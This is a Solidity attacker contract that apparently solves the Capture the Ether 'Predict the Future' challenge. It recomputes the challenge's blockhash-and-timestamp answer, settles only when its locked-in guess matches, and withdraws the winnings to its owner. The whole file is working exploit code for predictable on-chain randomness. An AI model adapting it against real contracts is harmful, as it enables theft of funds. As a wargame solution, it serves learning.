///SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface PredictTheFutureChallenge {
    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureAttacker {
    address private constant challengeAddress =
        0xbeb0E42bcDFFad24d45c329FA5793986d8A2c676;
    uint8 private constant guess = 5;
    address private immutable owner;

    event ReceiveEth(address sender, uint256 amount);
    event WithdrawEth(address reciver, uint256 amount);
    event GuessIsCorrect();

    constructor() payable {
        require(msg.value >= 1 ether, "Need to send at least 1 eth");
        PredictTheFutureChallenge(challengeAddress).lockInGuess{value: 1 ether}(
            guess
        );
        owner = msg.sender;
    }

    function perhapsGuess() external {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;

        require(answer == guess, "guess is not correct for this block");
        emit GuessIsCorrect();

        PredictTheFutureChallenge(challengeAddress).settle();
        // at this point this contract should have 2 eth
        withdraw();
    }

    // receives the eth during the settle call
    receive() external payable {
        emit ReceiveEth(msg.sender, msg.value);
    }

    function withdraw() private {
        uint256 amount = address(this).balance;
        (bool success, ) = owner.call{value: amount}("");
        require(success, "Failed to send Ether");
    }
}
